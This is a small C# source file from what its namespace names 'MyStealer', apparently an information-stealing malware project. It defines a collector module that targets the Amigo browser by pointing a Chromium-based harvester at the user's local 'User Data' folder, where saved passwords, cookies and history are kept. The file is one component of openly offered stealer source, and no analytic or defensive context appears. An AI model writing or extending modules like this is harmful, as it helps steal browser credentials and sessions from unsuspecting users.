using System.IO;
using System;
using MyStealer.Collector.Modules.Browser;

namespace MyStealer.Collector.Modules.Browser.ChromiumBased
{
    public class Amigo : Chromium
    {
        public override string ModuleName => "Amigo";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Amigo", "User Data");
    }
}
